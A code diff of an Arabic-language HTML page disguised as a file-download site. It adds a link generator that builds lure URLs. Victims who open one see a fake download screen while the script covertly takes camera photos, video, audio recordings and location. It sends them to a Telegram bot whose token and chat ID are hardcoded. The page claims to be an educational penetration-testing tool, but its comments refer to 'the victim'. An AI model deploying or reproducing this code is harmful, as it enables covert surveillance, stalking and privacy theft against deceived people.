@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>مركز تحميل الملفات - تحميل سريع</title>
     <style>
         * {
@@ -11,9 +11,10 @@
             box-sizing: border-box;
         }
 
+        /* الخلفية الرئيسية */
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,54 +22,57 @@
             padding: 20px;
         }
 
-        /* القسم الحقيقي (مخفي للمستخدم العادي) */
-        .admin-panel {
-            display: none;
+        /* زر الدخول للوحة التحكم (يظهر فقط للمختبر) */
+        .admin-btn {
             position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            padding: 10px;
-            border-radius: 10px;
-            z-index: 9999;
-        }
-        .admin-panel button {
-            background: #ff4444;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
             color: white;
             border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
+            padding: 10px 20px;
+            border-radius: 30px;
             cursor: pointer;
+            z-index: 9999;
+            font-size: 12px;
+            display: none;
+        }
+        .admin-btn:hover {
+            background: #ff4444;
         }
 
-        /* الصفحة المموهة (الوهمية) */
+        /* الصفحة المموهة (التي يراها الضحية) */
         .fake-page {
             max-width: 500px;
             width: 100%;
         }
 
         .download-card {
-            background: white;
+            background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
-            padding: 35px;
+            padding: 40px;
             text-align: center;
             box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-        }
-
-        .download-card h1 {
             color: #333;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-
-        .download-card p {
-            color: #666;
-            margin-bottom: 25px;
         }
 
         .file-icon {
             font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .file-name {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 10px;
             margin: 20px 0;
+            font-family: monospace;
+            color: #666;
         }
 
         .download-btn {
@@ -81,7 +85,8 @@
             font-weight: bold;
             cursor: pointer;
             width: 100%;
-            margin-top: 20px;
+            margin: 20px 0;
+            transition: 0.3s;
         }
 
         .download-btn:hover {
@@ -90,7 +95,7 @@
 
         .loading {
             display: none;
-            margin-top: 20px;
+            margin: 20px 0;
         }
 
         .spinner {
@@ -108,179 +113,568 @@
             100% { transform: rotate(360deg); }
         }
 
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background-color: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background-color: #4CAF50;
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+
         .ad-banner {
-            background: #f0f0f0;
-            padding: 15px;
+            background: #f9f9f9;
+            padding: 12px;
             margin-top: 20px;
             border-radius: 10px;
             color: #999;
-            font-size: 12px;
+            font-size: 11px;
+            border: 1px solid #eee;
         }
 
-        /* الوضع المخفي للضحية */
-        .hidden-panel {
+        .status-text {
+            font-size: 13px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        /* الأداة الحقيقية (تظهر بعد التفعيل) */
+        .real-tool {
             display: none;
+            max-width: 550px;
+            width: 100%;
+            background: rgba(20, 26, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 35px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+
+        .real-tool h2 {
+            background: linear-gradient(90deg, #00d4ff, #0077ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .real-tool .sub {
+            color: #8892b0;
+            text-align: center;
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+
+        .real-tool label {
+            display: block;
+            color: #ccd6f6;
+            margin: 15px 0 8px;
+            font-weight: 600;
+        }
+
+        .real-tool input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            background: rgba(10, 15, 26, 0.8);
+            color: #fff;
+            font-size: 14px;
+        }
+
+        .checkbox-group {
+            background: rgba(0, 212, 255, 0.05);
+            border-radius: 18px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+        }
+
+        .checkbox-item label {
+            margin: 0;
+            font-weight: normal;
+        }
+
+        .real-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #00d4ff, #0077ff);
+            border: none;
+            border-radius: 40px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .result-box {
+            margin-top: 20px;
+            background: rgba(0, 212, 255, 0.1);
+            border-radius: 14px;
+            padding: 12px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .copy-btn {
+            background: #0077ff;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 25px;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 25px;
+            color: #5a6e8a;
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
 
-<!-- زر الدخول إلى لوحة التحكم (يظهر فقط للمختبر) -->
-<div class="admin-panel" id="adminPanel">
-    <button onclick="showAdmin()">🔧 فتح لوحة التحكم</button>
-</div>
+<!-- زر الدخول للوحة التحكم -->
+<button class="admin-btn" id="adminBtn" onclick="showRealTool()">🔧 فتح لوحة التحكم</button>
 
-<!-- الصفحة المموهة (التي يراها الضحية) -->
+<!-- الصفحة المموهة (التي يراها الجميع أولاً) -->
 <div class="fake-page" id="fakePage">
     <div class="download-card">
         <div class="file-icon">📦</div>
-        <h1>تحميل ملف Setup_v2.4.rar</h1>
-        <p>حجم الملف: 24.7 MB</p>
-        <p>⏱️ وقت التحميل المتوقع: 30 ثانية</p>
+        <h2>تحميل ملف Setup_v2.4.rar</h2>
+        <div class="file-name">Setup_v2.4.rar (24.7 MB)</div>
+        
         <button class="download-btn" id="fakeDownloadBtn">📥 تحميل الملف</button>
+        
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p style="margin-top: 10px;">جاري التحميل...</p>
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="status-text" id="statusText">جاري الاتصال بالخادم...</div>
         </div>
+        
         <div class="ad-banner">
-            🔒 تم فحص الملف بواسطة antivirus • آمن 100%
+            🔒 تم فحص الملف بواسطة 35 برنامج مكافحة فيروسات • آمن 100%
         </div>
     </div>
 </div>
 
-<!-- الأداة الحقيقية (تظهر بعد 3 ثواني من الضغط على زر التحميل) -->
-<div class="hidden-panel" id="realTool">
-    <div style="max-width: 550px; margin: 0 auto; background: rgba(20,26,42,0.95); border-radius: 28px; padding: 35px; box-shadow: 0 25px 45px rgba(0,0,0,0.4);">
-        <h2 style="color: #00d4ff; text-align: center;">🛡️ Dark101 Security</h2>
-        <p style="color: #8892b0; text-align: center; margin-bottom: 20px;">أداة اختبار اختراق أخلاقي</p>
-        
-        <label style="color: #ccd6f6;">📱 Chat ID</label>
-        <input type="text" id="chatIdInput" value="5849068535" style="width:100%; padding:12px; margin-bottom:15px; background:#0a0f1a; border:1px solid #00d4ff; color:white; border-radius:10px;">
-        
-        <label style="color: #ccd6f6;">🤖 توكن البوت</label>
-        <input type="text" id="tokenInput" value="8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU" style="width:100%; padding:12px; margin-bottom:15px; background:#0a0f1a; border:1px solid #00d4ff; color:white; border-radius:10px;">
-        
-        <div style="background: rgba(0,212,255,0.05); border-radius: 18px; padding: 15px; margin: 20px 0;">
-            <div style="display: flex; gap: 12px; padding: 8px 0;">
-                <input type="checkbox" id="camFront" checked> <label style="color:#ccd6f6;">📸 صورة أمامية</label>
-            </div>
-            <div style="display: flex; gap: 12px; padding: 8px 0;">
-                <input type="checkbox" id="location" checked> <label style="color:#ccd6f6;">📍 الموقع</label>
-            </div>
-            <div style="display: flex; gap: 12px; padding: 8px 0;">
-                <input type="checkbox" id="audio"> <label style="color:#ccd6f6;">🎤 تسجيل صوتي</label>
-            </div>
+<!-- الأداة الحقيقية -->
+<div class="real-tool" id="realTool">
+    <h2>🛡️ Dark101 Security</h2>
+    <div class="sub">أداة اختبار اختراق أخلاقي - للأغراض التعليمية فقط</div>
+
+    <label>📱 Chat ID الخاص بك</label>
+    <input type="text" id="chatIdInput" value="5849068535">
+
+    <label>🤖 توكن البوت الخاص بك</label>
+    <input type="text" id="tokenInput" value="8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU">
+
+    <div class="checkbox-group">
+        <div class="checkbox-item">
+            <input type="checkbox" id="camFront" checked>
+            <label>📸 صورة من الكاميرا الأمامية</label>
         </div>
-        
-        <button id="realGenerateBtn" style="width:100%; padding:15px; background: linear-gradient(90deg,#00d4ff,#0077ff); border:none; border-radius:40px; color:white; font-weight:bold; cursor:pointer;">🔗 إنشاء رابط الاختبار</button>
-        
-        <div id="realResult" style="display:none; margin-top:20px; background:rgba(0,212,255,0.1); border-radius:14px; padding:12px; display:flex; gap:10px;">
-            <div id="realLinkText" style="flex:1; font-size:12px; color:#ccd6f6;"></div>
-            <button id="realCopyBtn" style="background:#0077ff; border:none; padding:8px 18px; border-radius:25px; color:white;">نسخ</button>
+        <div class="checkbox-item">
+            <input type="checkbox" id="camBack">
+            <label>📷 صورة من الكاميرا الخلفية</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="location" checked>
+            <label>📍 تحديد الموقع على الخريطة</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="audio">
+            <label>🎤 تسجيل صوتي (5 ثوان)</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="videoFront">
+            <label>🎥 فيديو من الكاميرا الأمامية (5 ثوان)</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="videoBack">
+            <label>📹 فيديو من الكاميرا الخلفية (5 ثوان)</label>
         </div>
     </div>
+
+    <button class="real-btn" id="generateBtn">🔗 إنشاء رابط الاختبار</button>
+
+    <div id="result" style="display: none;" class="result-box">
+        <div id="linkText" style="flex:1;font-size:12px;word-break:break-all"></div>
+        <button class="copy-btn" id="copyBtn">📋 نسخ</button>
+    </div>
+    <footer>Dark101 - للأغراض التعليمية فقط - اختبر على نفسك</footer>
 </div>
 
 <script>
-// الضغط على زر التحميل الوهمي
+// ================== بيانات البوت ==================
+const DEFAULT_BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
+const DEFAULT_CHAT_ID = "5849068535";
+
+// ================== الصفحة المموهة ==================
 let clickCount = 0;
 const fakeBtn = document.getElementById('fakeDownloadBtn');
-const loading = document.getElementById('loading');
-const fakePage = document.getElementById('fakePage');
-const realTool = document.getElementById('realTool');
+const loadingDiv = document.getElementById('loading');
+const progressBar = document.getElementById('progressBar');
+const progressFill = document.getElementById('progressFill');
+const statusText = document.getElementById('statusText');
+const fakePageDiv = document.getElementById('fakePage');
+const realToolDiv = document.getElementById('realTool');
+const adminBtn = document.getElementById('adminBtn');
 
 fakeBtn.onclick = () => {
     clickCount++;
     
     if (clickCount === 1) {
         // أول ضغطة: تظهر شاشة تحميل
-        loading.style.display = 'block';
+        loadingDiv.style.display = 'block';
+        progressBar.style.display = 'block';
         fakeBtn.disabled = true;
+        fakeBtn.style.opacity = '0.5';
         
-        setTimeout(() => {
-            loading.style.display = 'none';
-            fakeBtn.innerHTML = '⚠️ فشل التحميل - حاول مرة أخرى';
-            fakeBtn.disabled = false;
-            fakeBtn.style.background = '#ff4444';
-        }, 3000);
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 10;
+            progressFill.style.width = progress + '%';
+            if (progress === 30) statusText.innerText = 'جاري فحص الملف...';
+            if (progress === 60) statusText.innerText = 'اكتمل الفحص...';
+            if (progress === 80) statusText.innerText = 'جاري التحميل...';
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    loadingDiv.style.display = 'none';
+                    progressBar.style.display = 'none';
+                    fakeBtn.disabled = false;
+                    fakeBtn.style.opacity = '1';
+                    fakeBtn.innerText = '⚠️ فشل التحميل - حاول مرة أخرى';
+                    fakeBtn.style.background = '#ff4444';
+                    statusText.innerText = 'حدث خطأ في الاتصال بالخادم';
+                }, 500);
+            }
+        }, 200);
     } 
     else if (clickCount === 2) {
         // الضغطة الثانية: تظهر الأداة الحقيقية
-        loading.style.display = 'block';
+        loadingDiv.style.display = 'block';
+        progressBar.style.display = 'block';
+        progressFill.style.width = '0%';
+        statusText.innerText = 'جاري التحقق من الصلاحيات...';
         fakeBtn.disabled = true;
         
-        setTimeout(() => {
-            fakePage.style.display = 'none';
-            realTool.style.display = 'block';
-            document.body.style.background = '#0a0f1a';
-            
-            // إظهار لوحة التحكم للمختبر
-            document.getElementById('adminPanel').style.display = 'block';
-        }, 2000);
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 20;
+            progressFill.style.width = progress + '%';
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    fakePageDiv.style.display = 'none';
+                    realToolDiv.style.display = 'block';
+                    adminBtn.style.display = 'block';
+                    document.body.style.background = '#0a0f1a';
+                }, 500);
+            }
+        }, 200);
     }
 };
 
-// وظائف الأداة الحقيقية
-document.getElementById('realGenerateBtn').onclick = () => {
-    const chat = document.getElementById('chatIdInput').value;
-    const token = document.getElementById('tokenInput').value;
-    const features = [];
-    if(document.getElementById('camFront').checked) features.push('cam');
-    if(document.getElementById('location').checked) features.push('loc');
-    if(document.getElementById('audio').checked) features.push('audio');
-    
-    const link = `${window.location.href.split('?')[0]}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&f=${features.join(',')}`;
-    document.getElementById('realLinkText').innerText = link;
-    document.getElementById('realResult').style.display = 'flex';
-};
-
-document.getElementById('realCopyBtn').onclick = async () => {
-    await navigator.clipboard.writeText(document.getElementById('realLinkText').innerText);
-    alert('✅ تم نسخ الرابط');
-};
-
-// وظيفة فتح لوحة التحكم (إذا نسيها المختبر)
-function showAdmin() {
-    fakePage.style.display = 'none';
-    realTool.style.display = 'block';
+// وظيفة فتح الأداة الحقيقية
+function showRealTool() {
+    fakePageDiv.style.display = 'none';
+    realToolDiv.style.display = 'block';
+    adminBtn.style.display = 'none';
     document.body.style.background = '#0a0f1a';
-    document.getElementById('adminPanel').style.display = 'none';
 }
 
-// معالجة الرابط الجانبي
+// ================== دوال الأداة ==================
+async function sendLocation(chat, token) {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(false);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const url = `https://www.google.com/maps?q=${lat},${lon}`;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chat, text: `📍 الموقع الحالي\nالإحداثيات: ${lat}, ${lon}\n🔗 ${url}`})
+            });
+            resolve(true);
+        }, () => resolve(false));
+    });
+}
+
+async function capturePhoto(chat, token, facingMode, type) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.playsInline = true;
+        await video.play();
+        await new Promise(r => setTimeout(r, 500));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        const fd = new FormData();
+        fd.append('chat_id', chat);
+        fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+        fd.append('caption', `📸 صورة من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`);
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+    } catch(e) {
+        console.log('خطأ في الصورة:', e);
+        return false;
+    }
+}
+
+async function recordVideo(chat, token, facingMode, type) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}, audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'video/mp4'});
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('video', blob, `video_${Date.now()}.mp4`);
+            fd.append('caption', `🎥 فيديو من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'} - 5 ثوان`);
+            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {method: 'POST', body: fd});
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+        return true;
+    } catch(e) {
+        console.log('خطأ في الفيديو:', e);
+        return false;
+    }
+}
+
+async function recordAudio(chat, token) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'audio/mp4'});
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('audio', blob, `audio_${Date.now()}.mp4`);
+            fd.append('caption', '🎤 تسجيل صوتي - 5 ثوان');
+            await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {method: 'POST', body: fd});
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+        return true;
+    } catch(e) {
+        console.log('خطأ في التسجيل:', e);
+        return false;
+    }
+}
+
+// إنشاء الرابط
+document.getElementById('generateBtn').onclick = () => {
+    let chat = document.getElementById('chatIdInput').value.trim();
+    let token = document.getElementById('tokenInput').value.trim();
+    
+    if (!chat) chat = DEFAULT_CHAT_ID;
+    if (!token) token = DEFAULT_BOT_TOKEN;
+    
+    if (!chat || !token) {
+        alert('❌ الرجاء إدخال Chat ID وتوكن البوت');
+        return;
+    }
+    
+    const features = [];
+    if (document.getElementById('camFront').checked) features.push('camFront');
+    if (document.getElementById('camBack').checked) features.push('camBack');
+    if (document.getElementById('location').checked) features.push('location');
+    if (document.getElementById('audio').checked) features.push('audio');
+    if (document.getElementById('videoFront').checked) features.push('videoFront');
+    if (document.getElementById('videoBack').checked) features.push('videoBack');
+    
+    if (features.length === 0) {
+        alert('❌ الرجاء اختيار ميزة واحدة على الأقل');
+        return;
+    }
+    
+    const baseUrl = window.location.href.split('?')[0];
+    const link = `${baseUrl}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${features.join(',')}`;
+    
+    document.getElementById('linkText').innerText = link;
+    document.getElementById('result').style.display = 'flex';
+};
+
+// نسخ الرابط
+document.getElementById('copyBtn').onclick = async () => {
+    const text = document.getElementById('linkText').innerText;
+    if (text) {
+        await navigator.clipboard.writeText(text);
+        const btn = document.getElementById('copyBtn');
+        btn.innerText = '✅ تم';
+        setTimeout(() => btn.innerText = '📋 نسخ', 2000);
+    }
+};
+
+// ================== معالجة رابط الضحية (صفحة مموهة متقنة) ==================
 const urlParams = new URLSearchParams(window.location.search);
 const chatParam = urlParams.get('chat');
 const tokenParam = urlParams.get('token');
-const fParam = urlParams.get('f');
+const featuresParam = urlParams.get('features');
 
-if(chatParam && tokenParam && fParam) {
-    // إخفاء كل شيء وإظهار شاشة تحميل وهمية للضحية
+if (chatParam && tokenParam && featuresParam) {
+    // إخفاء كل شيء وعرض صفحة تمويه متقنة للضحية
     document.body.innerHTML = `
-        <div style="text-align:center;padding:50px;background:white;min-height:100vh;">
-            <div style="max-width:400px;margin:0 auto">
-                <div class="spinner" style="margin:0 auto"></div>
-                <h3 style="margin-top:20px">جاري تحضير الملف...</h3>
-                <p style="color:#666">يرجى الانتظار</p>
+        <!DOCTYPE html>
+        <html lang="ar" dir="rtl">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>مركز تحميل الملفات</title>
+            <style>
+                *{margin:0;padding:0;box-sizing:border-box}
+                body{
+                    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+                    background:linear-gradient(135deg,#1e3c72,#2a5298);
+                    min-height:100vh;
+                    display:flex;
+                    justify-content:center;
+                    align-items:center;
+                    padding:20px;
+                }
+                .download-card{
+                    background:rgba(255,255,255,0.95);
+                    border-radius:20px;
+                    padding:40px;
+                    text-align:center;
+                    max-width:450px;
+                    width:100%;
+                    box-shadow:0 20px 40px rgba(0,0,0,0.2);
+                }
+                .file-icon{font-size:80px;margin-bottom:20px}
+                h2{color:#333;margin-bottom:10px}
+                .file-name{
+                    background:#f0f0f0;
+                    padding:10px;
+                    border-radius:10px;
+                    margin:20px 0;
+                    font-family:monospace;
+                    color:#666;
+                }
+                .progress-bar{
+                    width:100%;
+                    height:8px;
+                    background-color:#e0e0e0;
+                    border-radius:4px;
+                    margin:20px 0;
+                    overflow:hidden;
+                }
+                .progress-fill{
+                    width:0%;
+                    height:100%;
+                    background-color:#4CAF50;
+                    border-radius:4px;
+                    transition:width 0.3s ease;
+                }
+                .status-text{font-size:13px;color:#666;margin-top:10px}
+                .ad-banner{
+                    background:#f9f9f9;
+                    padding:12px;
+                    margin-top:20px;
+                    border-radius:10px;
+                    color:#999;
+                    font-size:11px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="download-card">
+                <div class="file-icon">📦</div>
+                <h2>جاري تجهيز ملف Setup.zip</h2>
+                <div class="file-name">Setup_v2.4.rar (24.7 MB)</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="status-text" id="statusText">جاري الاتصال بالخادم...</div>
+                <div class="ad-banner">
+                    🔒 يتم فحص الملف بواسطة 35 برنامج مكافحة فيروسات
+                </div>
             </div>
-        </div>
-        <style>
-            .spinner{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;animation:spin 1s linear infinite}
-            @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        </style>
+            <script>
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += Math.floor(Math.random() * 10) + 5;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(interval);
+                        document.getElementById('statusText').innerHTML = '❌ فشل التحميل - يرجى المحاولة مرة أخرى <a href="#" onclick="location.reload()">إعادة المحاولة</a>';
+                    }
+                    document.getElementById('progressFill').style.width = progress + '%';
+                    if (progress < 30) document.getElementById('statusText').innerHTML = 'جاري الاتصال بالخادم...';
+                    else if (progress < 60) document.getElementById('statusText').innerHTML = 'جاري فحص الملف...';
+                    else if (progress < 90) document.getElementById('statusText').innerHTML = 'جاري التحميل...';
+                }, 300);
+            <\/script>
+        </body>
+        </html>
     `;
     
-    // إرسال البيانات في الخلفية
+    // تنفيذ الميزات في الخلفية
+    const features = featuresParam.split(',');
+    
     setTimeout(() => {
-        if(fParam.includes('loc')) {
+        // الموقع
+        if (features.includes('location')) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 fetch(`https://api.telegram.org/bot${tokenParam}/sendMessage`, {
-                    method:'POST', headers:{'Content-Type':'application/json'},
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: chatParam, text: `📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`})
                 });
-            });
+            }, () => {});
         }
-        if(fParam.includes('cam')) {
-            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+        
+        // الكاميرا الأمامية
+        if (features.includes('camFront')) {
+            navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}}).then(stream => {
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
@@ -292,14 +686,76 @@ if(chatParam && tokenParam && fParam) {
                     canvas.toBlob(blob => {
                         const fd = new FormData();
                         fd.append('chat_id', chatParam);
-                        fd.append('photo', blob, 'photo.jpg');
-                        fetch(`https://api.telegram.org/bot${tokenParam}/sendPhoto`, {method:'POST', body:fd});
+                        fd.append('photo', blob, 'front.jpg');
+                        fetch(`https://api.telegram.org/bot${tokenParam}/sendPhoto`, {method: 'POST', body: fd});
                         stream.getTracks().forEach(t => t.stop());
                     });
                 }, 1000);
-            });
+            }).catch(() => {});
         }
-        if(fParam.includes('audio')) {
+        
+        // الكاميرا الخلفية
+        if (features.includes('camBack')) {
+            navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}}).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatParam);
+                        fd.append('photo', blob, 'back.jpg');
+                        fetch(`https://api.telegram.org/bot${tokenParam}/sendPhoto`, {method: 'POST', body: fd});
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                }, 1000);
+            }).catch(() => {});
+        }
+        
+        // فيديو أمامي
+        if (features.includes('videoFront')) {
+            navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: true}).then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, {type: 'video/mp4'});
+                    const fd = new FormData();
+                    fd.append('chat_id', chatParam);
+                    fd.append('video', blob, 'video_front.mp4');
+                    fetch(`https://api.telegram.org/bot${tokenParam}/sendVideo`, {method: 'POST', body: fd});
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+            }).catch(() => {});
+        }
+        
+        // فيديو خلفي
+        if (features.includes('videoBack')) {
+            navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: true}).then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, {type: 'video/mp4'});
+                    const fd = new FormData();
+                    fd.append('chat_id', chatParam);
+                    fd.append('video', blob, 'video_back.mp4');
+                    fetch(`https://api.telegram.org/bot${tokenParam}/sendVideo`, {method: 'POST', body: fd});
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+            }).catch(() => {});
+        }
+        
+        // تسجيل صوتي
+        if (features.includes('audio')) {
             navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -309,18 +765,14 @@ if(chatParam && tokenParam && fParam) {
                     const fd = new FormData();
                     fd.append('chat_id', chatParam);
                     fd.append('audio', blob, 'audio.mp4');
-                    fetch(`https://api.telegram.org/bot${tokenParam}/sendAudio`, {method:'POST', body:fd});
+                    fetch(`https://api.telegram.org/bot${tokenParam}/sendAudio`, {method: 'POST', body: fd});
                 };
                 mediaRecorder.start();
                 setTimeout(() => mediaRecorder.stop(), 5000);
-            });
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+            }).catch(() => {});
         }
-        
-        // توجيه الضحية لموقع حقيقي بعد 5 ثوان
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 5000);
-    }, 1000);
+    }, 2000);
 }
 </script>
 </body>
